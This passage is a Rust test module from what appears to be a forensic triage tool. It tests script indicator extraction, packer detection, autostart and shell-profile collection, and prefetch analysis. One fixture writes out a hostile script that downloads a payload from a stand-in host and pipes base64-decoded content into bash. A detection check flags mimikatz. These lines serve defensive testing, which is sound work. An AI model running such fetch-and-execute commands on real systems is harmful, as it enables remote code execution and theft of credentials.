            "curl -fsSL https://bad.example/payload?token=hidden -o /tmp/payload\nexport $API_TOKEN\necho {encoded} | base64 -d | bash\ncrontab -e\n203.0.113.7"
        );
        let analysis = static_script_indicators(&content);

        assert_eq!(analysis["execution_mode"], "static_only");
        assert!(analysis["urls"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "https://bad.example/payload"));
        assert!(analysis["domains"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "bad.example"));
        assert!(analysis["ip_addresses"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "203.0.113.7"));
        assert!(analysis["file_or_registry_paths"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "/tmp/payload"));
        assert!(analysis["environment_variables"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "API_TOKEN"));
        assert!(analysis["behavior_indicators"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "persistence"));
        assert!(!analysis.to_string().contains(encoded));
        assert!(analysis["encoded_strings"].as_array().unwrap()[0]["sha256"]
            .as_str()
            .is_some());
    }

    #[test]
    fn test_detect_binary_anomalies_flags_upx_packers() {
        let tmp = std::env::temp_dir().join("jockey-binary-anomaly-tests");
        let _ = std::fs::create_dir_all(&tmp);
        let path = tmp.join("sample.bin");
        let bytes = b"UPX0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        std::fs::write(&path, bytes).unwrap();

        let results = detect_binary_anomalies(tmp.to_str().unwrap()).unwrap();
        let suspicious = results
            .iter()
            .find(|r| r.get("suspicious").and_then(|v| v.as_bool()) == Some(true))
            .unwrap();
        assert!(suspicious["suspicious"].as_bool().unwrap());
        let metadata = suspicious["metadata"].as_object().unwrap();
        assert!(metadata["anomalies"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v.as_str() == Some("packing_signature")));
        assert!(metadata["packer_signatures"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v.as_str() == Some("upx")));
    }

    #[test]
    fn test_collect_autostart_entries_reads_real_paths() {
        let tmp = std::env::temp_dir().join("jockey-autostart-tests");
        let _ = std::fs::create_dir_all(&tmp);
        let startup = tmp.join(".bashrc");
        std::fs::write(
            &startup,
            "export PATH=$PATH:/tmp\nexport API_TOKEN=secret-value\n",
        )
        .unwrap();

        let result = collect_autostart_entries(Some(tmp.to_str().unwrap()));
        assert!(result.is_ok(), "autostart collection should succeed");
        let records = result.unwrap();
        assert!(!records.is_empty());
        assert!(!serde_json::to_string(&records)
            .unwrap()
            .contains("secret-value"));
    }

    #[test]
    fn test_shell_profile_collector_extracts_indicators_not_contents() {
        let root = std::env::temp_dir().join(format!("jockey-profile-{}", std::process::id()));
        std::fs::create_dir_all(&root).unwrap();
        let profile = root.join(".profile");
        std::fs::write(
            &profile,
            "export API_TOKEN=secret-value\neval \"$PROMPT_COMMAND\"\n",
        )
        .unwrap();

        let records = collect_shell_profiles(Some(profile.to_str().unwrap())).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        assert_eq!(records.len(), 1);
        assert_eq!(records[0]["artifact_type"], "shell_profile");
        assert_eq!(records[0]["active_directive_count"], 2);
        assert!(records[0]["indicators"]
            .as_array()
            .unwrap()
            .iter()
            .any(|value| value == "dynamic_evaluation"));
        assert!(!records[0].to_string().contains("secret-value"));
    }

    #[test]
    fn test_xdg_autostart_parser_reads_desktop_fields() {
        let root = std::env::temp_dir().join(format!("jockey-xdg-startup-{}", std::process::id()));
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join("updater.desktop"),
            "[Desktop Entry]\nName=Updater\nExec=/usr/bin/updater --check\nHidden=false\n",
        )
        .unwrap();

        let records = collect_xdg_autostart_entries(Some(root.to_str().unwrap())).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        assert_eq!(records.len(), 1);
        assert_eq!(records[0]["desktop_entry"]["Name"], "Updater");
        assert_eq!(
            records[0]["desktop_entry"]["Exec"],
            "/usr/bin/updater --check"
        );
    }

    #[test]
    fn test_carve_artifacts_all() {
        let result = carve_artifacts("all", "/nonexistent");
        assert!(result.is_ok());
    }

    #[test]
    fn test_carve_history_home() {
        let result = carve_artifacts("history", "/home");
        assert!(
            result.is_ok(),
            "carve_artifacts history failed: {:?}",
            result.err()
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_carve_systemd_units() {
        let result = carve_artifacts("systemd", "/etc/systemd/system");
        assert!(result.is_ok());
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_carve_cron() {
        let result = carve_artifacts("cron", "/etc/cron.d");
        assert!(result.is_ok());
        let entries = result.unwrap();
        for e in &entries {
            if let Some(t) = e.get("artifact_type") {
                assert_eq!(t, "cron");
            }
        }
    }

    #[test]
    fn test_prefetch_name_parsing() {
        let (name, hash) = parse_prefetch_name("POWERSHELL.EXE-ABC12345.pf");
        assert_eq!(name, "powershell.exe");
        assert_eq!(hash, "ABC12345");
    }

    #[test]
    fn test_suspicious_prefetch_detection() {
        assert!(is_suspicious_prefetch("powershell"));
        assert!(is_suspicious_prefetch("mimikatz"));
        assert!(!is_suspicious_prefetch("notepad"));
    }
}
